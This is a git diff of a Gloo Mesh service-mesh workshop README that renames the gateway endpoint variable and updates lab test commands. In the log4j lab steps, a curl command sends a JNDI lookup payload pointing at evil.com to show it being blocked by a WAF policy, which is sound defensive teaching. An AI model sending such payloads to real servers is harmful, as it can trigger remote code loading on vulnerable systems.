@@ -357,9 +357,9 @@ Note the following settings.
 3. Open the Online Boutique in your browser
 
 ```sh
-export HTTP_GATEWAY_ENDPOINT=$(kubectl --context ${CLUSTER1} -n istio-gateways get svc istio-ingressgateway -o jsonpath='{.status.loadBalancer.ingress[0].*}'):80
+export GLOO_GATEWAY=$(kubectl --context ${CLUSTER1} -n istio-gateways get svc istio-ingressgateway -o jsonpath='{.status.loadBalancer.ingress[0].*}'):80
 
-echo "Online Boutique available at http://$HTTP_GATEWAY_ENDPOINT"
+echo "Online Boutique available at http://$GLOO_GATEWAY"
 ```
 
 ## Lab 7 - Zero Trust Networking <a name="Lab-7"></a>
@@ -536,6 +536,7 @@ spec:
     - name: frontend
       labels:
         virtual-destination: frontend
+        oauth: "true"
       forwardTo:
         destinations:
           - ref:
@@ -563,7 +564,7 @@ Review the following update to the `RouteTable` resource. You must configure the
 * Alternatively you can test this using curl
 
 ```sh
-for i in {1..6}; do curl -sSk http://$HTTP_GATEWAY_ENDPOINT | grep "Cluster Name:"; done
+for i in {1..6}; do curl -sSk http://$GLOO_GATEWAY | grep "Cluster Name:"; done
 ```
 
 5. You can create a Gloo Mesh `FailoverPolicy` custom resource to configure locality-based load balancing across your virtual destinations. Apply this policy now.
@@ -677,7 +678,7 @@ In this section of the lab, take a quick look at how to prevent the `log4j` expl
 2. Confirm that a malicious JNDI request currently succeeds. Note the `200` success response. Later, you create a WAF policy to block such requests.
 
 ```sh
-curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$HTTP_GATEWAY_ENDPOINT
+curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$GLOO_GATEWAY
 ```
 
 3. With the Gloo Mesh WAF policy custom resource, you can create reusable policies for ModSecurity. Review the `log4j` WAF policy and the frontend route table. Note the following settings.
@@ -713,7 +714,7 @@ EOF
 4. Try the previous request again.
 
 ```sh
-curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$HTTP_GATEWAY_ENDPOINT
+curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$GLOO_GATEWAY
 ```
 
 Note that the request is now blocked with the custom intervention message from the WAF policy.
@@ -919,7 +920,7 @@ kubectl --context ${MGMT} delete ExtAuthPolicy frontend -n web-team
 * Test Rate Limiting
 
 ```sh
-for i in {1..6}; do curl -iksS -X GET http://$HTTP_GATEWAY_ENDPOINT | tail -n 10; done
+for i in {1..6}; do curl -iksS -X GET http://$GLOO_GATEWAY | tail -n 10; done
 ```
 
 * Expected Response - If you try the Online Boutique UI you will see a blank page because the rate-limit response is in the headers
